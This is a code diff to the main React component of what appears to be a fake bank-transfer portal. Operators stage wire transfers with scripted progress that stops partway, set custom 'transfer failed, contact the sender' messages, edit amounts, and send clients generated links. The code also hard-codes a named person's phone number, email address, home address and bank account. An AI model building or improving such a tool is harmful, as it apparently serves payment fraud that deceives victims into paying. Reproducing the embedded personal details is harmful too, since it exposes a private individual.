@@ -62,6 +62,13 @@ export default function App() {
   const [activeTab, setActiveTab] = useState<string>('dashboard');
   const [liveSimulationTx, setLiveSimulationTx] = useState<SimulatedTransfer | null>(null);
   const [toast, setToast] = useState<string | null>(null);
+  const [resolvingDirectLink, setResolvingDirectLink] = useState<boolean>(() => {
+    const searchParams = new URLSearchParams(window.location.search);
+    const hasDirectQuery = searchParams.get('sid') || 
+                           searchParams.get('c') || 
+                           (searchParams.get('portal') === 'true' && searchParams.get('txid'));
+    return !!hasDirectQuery;
+  });
   const [showLandingPage, setShowLandingPage] = useState<boolean>(() => {
     const searchParams = new URLSearchParams(window.location.search);
     const hasClientQuery = searchParams.get('sid') || 
@@ -434,72 +441,88 @@ export default function App() {
     const txidParam = getUrlParam('txid');
 
     async function checkUrlParams() {
-      if (cParam) {
-        const targetId = cParam.startsWith('tx-') ? cParam : `tx-${cParam}`;
-        
-        // Load target transfer directly from Firestore or any field matching to ensure multi-device robustness!
-        let match = await findTransferByAnyField(cParam) || await getTransferByIdFromDb(targetId);
+      try {
+        if (cParam) {
+          const targetId = cParam.startsWith('tx-') ? cParam : `tx-${cParam}`;
+          
+          // Load target transfer directly from Firestore or any field matching to ensure multi-device robustness!
+          let match = await findTransferByAnyField(cParam) || await getTransferByIdFromDb(targetId);
 
-        if (!match) {
-          // Check local list fallback
-          match = transfers.find(t => 
-            t.id === cParam || 
-            t.id === `tx-${cParam}` ||
-            t.codePin === cParam ||
-            t.reference?.toLowerCase().includes(cParam.toLowerCase())
-          );
-        }
+          if (!match) {
+            // Check local list fallback
+            match = transfers.find(t => 
+              t.id === cParam || 
+              t.id === `tx-${cParam}` ||
+              t.codePin === cParam ||
+              t.reference?.toLowerCase().includes(cParam.toLowerCase())
+            );
+          }
 
-        // If completely absent, initialize the Samuel BELLO custom pre-seeded scenario!
-        if (!match) {
-          const generatedId = `tx-${cParam}`;
-          match = {
-            id: generatedId,
-            version: 'V1',
-            lastName: 'BELLO',
-            firstName: 'Samuel',
-            country: 'Bénin (+229)',
-            phone: '+229 97 61 26 73',
-            email: 'gabriellagarguczi@gmail.com',
-            address: 'Lot 45, Quartier Haie Vive, Cotonou',
-            language: 'Français',
-            senderBank: 'TRANSFERWIRE SECURE PLATFORM',
-            amount: 10000,
-            currency: 'EUR (€)',
-            startPercentage: 15,
-            stopPercentage: 50,
-            customMessage: "Echec du transfert un problème est survenu, veuillez contacter l'expéditeur ou le support transferwire. Cordialement",
-            emailAlert: true,
-            smsAlert: false,
-            codePin: '117850',
-            isBlocked: false,
-            senderName: 'Trésorerie Centrale Pro',
-            recipientName: 'Samuel BELLO',
-            recipientBank: 'Bank of Africa Benin',
-            recipientAccount: 'BJ328 09483 09489 001',
-            type: 'BANK_WIRE',
-            reference: `TRW-${cParam.toUpperCase()}`,
-            createdAt: new Date().toISOString(),
-            status: 'SUCCESS',
-            delaySeconds: 4,
-            otpCode: '',
-            feePercent: 1.2,
-            isCompleted: false,
-            generatedUrl: `${getPublicOrigin()}/espace-client/?c=${cParam}`
-          };
-        }
+          // If completely absent, initialize the Samuel BELLO custom pre-seeded scenario!
+          if (!match) {
+            const generatedId = `tx-${cParam}`;
+            match = {
+              id: generatedId,
+              version: 'V1',
+              lastName: 'BELLO',
+              firstName: 'Samuel',
+              country: 'Bénin (+229)',
+              phone: '+229 97 61 26 73',
+              email: 'gabriellagarguczi@gmail.com',
+              address: 'Lot 45, Quartier Haie Vive, Cotonou',
+              language: 'Français',
+              senderBank: 'TRANSFERWIRE SECURE PLATFORM',
+              amount: 10000,
+              currency: 'EUR (€)',
+              startPercentage: 15,
+              stopPercentage: 50,
+              customMessage: "Echec du transfert un problème est survenu, veuillez contacter l'expéditeur ou le support transferwire. Cordialement",
+              emailAlert: true,
+              smsAlert: false,
+              codePin: '117850',
+              isBlocked: false,
+              senderName: 'Trésorerie Centrale Pro',
+              recipientName: 'Samuel BELLO',
+              recipientBank: 'Bank of Africa Benin',
+              recipientAccount: 'BJ328 09483 09489 001',
+              type: 'BANK_WIRE',
+              reference: `TRW-${cParam.toUpperCase()}`,
+              createdAt: new Date().toISOString(),
+              status: 'SUCCESS',
+              delaySeconds: 4,
+              otpCode: '',
+              feePercent: 1.2,
+              isCompleted: false,
+              generatedUrl: `${getPublicOrigin()}/espace-client/?c=${cParam}`
+            };
+          }
 
-        if (match) {
-          setLiveSimulationTx(match);
+          if (match) {
+            const hasSession = sessionStorage.getItem('client_session_txid') === match.id;
+            if (hasSession) {
+              setLiveSimulationTx(match);
+            } else {
+              setLiveSimulationTx(null);
+            }
+          }
+        } else if (portalParam === 'true' && txidParam) {
+          let match = await findTransferByAnyField(txidParam) || await getTransferByIdFromDb(txidParam);
+          if (!match) {
+            match = transfers.find(t => t.id === txidParam);
+          }
+          if (match) {
+            const hasSession = sessionStorage.getItem('client_session_txid') === match.id;
+            if (hasSession) {
+              setLiveSimulationTx(match);
+            } else {
+              setLiveSimulationTx(null);
+            }
+          }
         }
-      } else if (portalParam === 'true' && txidParam) {
-        let match = await findTransferByAnyField(txidParam) || await getTransferByIdFromDb(txidParam);
-        if (!match) {
-          match = transfers.find(t => t.id === txidParam);
-        }
-        if (match) {
-          setLiveSimulationTx(match);
-        }
+      } catch (err) {
+        console.error("Error resolving direct client parameters:", err);
+      } finally {
+        setResolvingDirectLink(false);
       }
     }
 
@@ -528,6 +551,7 @@ export default function App() {
       setCurrentUser(null);
       setUserRole(null);
       localStorage.removeItem('user_role');
+      sessionStorage.removeItem('client_session_txid');
       setBypassAdmin(false);
       setLiveSimulationTx(null);
       setShowLandingPage(true);
@@ -631,7 +655,8 @@ export default function App() {
       montant: transferData.amount,
       statut: 'actif',
       plan: 'vip',
-      createdAt: Date.now()
+      createdAt: Date.now(),
+      name: `${transferData.firstName} ${transferData.lastName}`
     };
     saveClientToDb(newClient);
 
@@ -659,6 +684,18 @@ export default function App() {
       }
       return updated;
     });
+  };
+
+  const onUpdateTransferAmount = (id: string, newAmount: number) => {
+    setTransfers(prev => {
+      const updated = prev.map(t => t.id === id ? { ...t, amount: newAmount } : t);
+      const found = updated.find(t => t.id === id);
+      if (found) {
+        saveTransferToDb(found);
+      }
+      return updated;
+    });
+    setLiveSimulationTx(prev => prev && prev.id === id ? { ...prev, amount: newAmount } : prev);
   };
 
   const onUpdatePercentages = (id: string, start: number, stop: number, message: string) => {
@@ -747,7 +784,7 @@ export default function App() {
       recipientName: quickRecipient.trim(),
       recipientBank: quickGate,
       recipientAccount: 'FR76 3000 4000 5000 6000 7000 123',
-      type: 'SEPA',
+      type: 'BANK_WIRE',
       reference: `FTX-QUICK-${Math.floor(10000 + Math.random() * 90000)}`,
       status: 'SUCCESS',
       delaySeconds: 3,
@@ -766,11 +803,11 @@ export default function App() {
   const emailCountTotal = campaigns.filter(c => c.type === 'EMAIL').reduce((acc, c) => acc + c.recipientsCount, 0);
 
   // loading state
-  if (authLoading) {
+  if (authLoading || resolvingDirectLink) {
     return (
-      <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4">
-        <div className="h-10 w-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mb-4" />
-        <span className="text-xs text-slate-400 font-mono tracking-widest animate-pulse">CHARGEMENT DES SYSTÈMES SECURE...</span>
+      <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4 text-center">
+        <div className="h-10 w-10 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4 mx-auto" />
+        <span className="text-xs text-slate-400 font-mono tracking-widest animate-pulse uppercase">Connexion Sécurisée en cours...</span>
       </div>
     );
   }
@@ -812,6 +849,7 @@ export default function App() {
         }} 
         onSetCompleted={onSetCompleted}
         onTriggerEmailNotification={onTriggerEmailNotification}
+        onUpdateTransferAmount={onUpdateTransferAmount}
         isFirebaseAuthed={currentUser !== null && userRole === 'client'}
         firebaseSignOut={handleLogout}
         isOperatorView={false}
@@ -852,6 +890,7 @@ export default function App() {
         onBeneficiaryAuthenticated={(transfer) => {
           setUserRole('client');
           localStorage.setItem('user_role', 'client');
+          sessionStorage.setItem('client_session_txid', transfer.id);
           setLiveSimulationTx(transfer);
           setShowLandingPage(false);
         }}
@@ -935,17 +974,6 @@ export default function App() {
               </button>
             </div>
           </header>
-
-          {/* Permanent warning bar about aistudio.google.com copying to prevent 403 errors */}
-          <div className="bg-amber-500/10 border border-amber-500/20 rounded-2xl p-4 sm:px-6 flex items-start gap-3.5 text-xs text-amber-800 shadow-sm leading-relaxed">
-            <span className="text-lg leading-none shrink-0">⚠️</span>
-            <div>
-              <strong className="text-amber-900 font-bold block mb-0.5">Note de conformité importante :</strong>
-              <span>
-                Ne partagez jamais l'adresse de votre navigateur contenant <code className="bg-amber-100 px-1 py-0.5 rounded font-mono font-bold text-amber-900">aistudio.google.com</code> avec vos clients, car cela produira une <strong>erreur Google 403 (Accès interdit)</strong>. Utilisez uniquement le <strong>Lien de connexion client</strong> généré spécifiquement lors de la création d'un Flash V1 ou V2.
-              </span>
-            </div>
-          </div>
 
           {/* Core View tabs routing switcher */}
           {activeTab === 'dashboard' && (
@@ -1069,6 +1097,7 @@ export default function App() {
           onClose={() => setLiveSimulationTx(null)} 
           onSetCompleted={onSetCompleted}
           onTriggerEmailNotification={onTriggerEmailNotification}
+          onUpdateTransferAmount={onUpdateTransferAmount}
           isFirebaseAuthed={currentUser !== null && userRole === 'client'}
           firebaseSignOut={handleLogout}
           isOperatorView={true}
